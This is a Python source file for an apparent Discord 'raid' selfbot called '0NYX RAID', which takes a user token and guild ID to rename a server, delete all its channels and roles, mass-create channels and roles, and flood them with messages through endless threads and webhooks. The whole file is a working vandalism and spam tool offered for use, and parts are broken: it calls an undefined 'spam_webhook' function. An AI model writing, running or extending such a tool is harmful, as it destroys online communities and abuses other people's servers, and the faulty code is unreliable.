import os
import requests
import threading
import time

menu = "\033[32m" + """
         ██▀███   ▄▄▄       ██▓▓█████▄
         ▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
         ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
         ▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
         ░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓
         ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒
           ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒
           ░░   ░   ░   ▒    ▒ ░ ░ ░  ░
               ░           ░  ░ ░     ░
                        ░

                >>  0 N Y X   R A I D  <<
                 >>  SELFBOT VERSION  <<
""" + "\033[0m"

menu2 = "\033[32m" + """
     ┌───────────────────────────┐
     │        RAID OPTIONS       │
     └───────────────────────────┘

  [0] ► Back to Main Menu
  [1] ► Raid (Full Attack)
  [2] ► Message Spam
  [3] ► Delete Channels
  [4] ► Create Channels
  [5] ► Create Roles
  [6] ► Delete Roles
""" + "\033[0m"



def show_menu():
    print(f"\033[32m{menu}")
    print(f"\033[32m{menu2}\033[0m")

def is_user_token_valid(token):
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    return response.status_code == 200

def create_webhook(channel_id, headers):
    webhook_data = {"name": "spam-webhook"}
    response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=webhook_data)
    if response.status_code == 201:
        webhook = response.json()
        return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
    return None

def spam_channel(channel_id, headers, spam_message):
    while True:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json={"content": spam_message})
        time.sleep(0.5)

def nuke(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    channel_count = int(input('\033[32mNumber of Channels to Create >> \033[0m'))
    spam_message = input('\033[32mMessage to Spam >> \033[0m')
    new_name = input('\033[32mNew Server Name >> \033[0m')
    new_icon_url = input('\033[32mNew Server Icon URL >> \033[0m')
    print(f"\033[32m[?]\033[0m Nuke en cours \033[32m[?]\033[0m")

    headers = {"Authorization": f"Bearer {token}"}

    requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json={"name": new_name, "icon": new_icon_url})

    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
        time.sleep(0.1)

    created_channels = []
    for i in range(channel_count):
        channel_data = {"name": "０𝚗𝚢𝚡.dll｜Ｒ𝚊𝚒𝚍", "type": 0}
        new_channel = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data).json()
        created_channels.append(new_channel['id'])
        time.sleep(0.1)

    webhooks = []
    for channel_id in created_channels:
        webhook_url = create_webhook(channel_id, headers)
        if webhook_url:
            webhooks.append(webhook_url)
            time.sleep(1)

    for webhook_url in webhooks:
        threading.Thread(target=spam_webhook, args=(webhook_url, spam_message)).start()

    for channel_id in created_channels:
        threading.Thread(target=spam_channel, args=(channel_id, headers, spam_message)).start()

def message_spam(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    spam_message = input('\033[32mMessage to Spam >> \033[0m')
    print(f"\033[32m[?]\033[0m Spam en cours \033[32m[?]\033[0m")

    headers = {"Authorization": f"Bearer {token}"}
    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()

    for channel in channels:
        threading.Thread(target=spam_channel, args=(channel['id'], headers, spam_message)).start()

def delete_channel(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    print(f"\033[32m[?]\033[0m Delete Channel en cours \033[32m[?]\033[0m")
    headers = {"Authorization": f"Bearer {token}"}
    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
        time.sleep(0.1)

def create_channel(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    channel_name = input('\033[32mChannel Name >> \033[0m')
    channel_count = int(input('\033[32mNumber of Channels to Create >> \033[0m'))
    print(f"\033[32m[?]\033[0m Mass Channel en cours \033[32m[?]\033[0m")

    headers = {"Authorization": f"Bearer {token}"}
    for _ in range(channel_count):
        channel_data = {"name": channel_name, "type": 0}
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data)
        time.sleep(0.1)

def create_role(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    role_name = input('\033[32mRole Name >> \033[0m')
    role_count = int(input('\033[32mNumber of Roles to Create >> \033[0m'))
    print(f"\033[32m[?]\033[0m Mass Role en cours \033[32m[?]\033[0m")

    headers = {"Authorization": f"Bearer {token}"}
    for _ in range(role_count):
        role_data = {"name": role_name}
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=role_data)
        time.sleep(0.1)

def delete_role(token):
    guild_id = input('\033[32mGuild ID >> \033[0m')
    print(f"\033[32m[?]\033[0m Delete Role en cours \033[32m[?]\033[0m")

    headers = {"Authorization": f"Bearer {token}"}
    roles = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers).json()

    for role in roles:
        if role['name'] != "@everyone":
            requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=headers)
            time.sleep(0.1)

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\033[32m> Choose an option:\033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    nuke(token)
            elif choice == 2:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    message_spam(token)
            elif choice == 3:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    delete_channel(token)
            elif choice == 4:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    create_channel(token)
            elif choice == 5:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    create_role(token)
            elif choice == 6:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[32m{menu}")
                token = input('\033[32mToken >> \033[0m')
                if is_user_token_valid(token):
                    delete_role(token)
            else:
                print("\033[32m[!] Invalid choice\033[0m")
                time.sleep(1)
        except ValueError:
            print("\033[32m[!] Please enter a number\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()
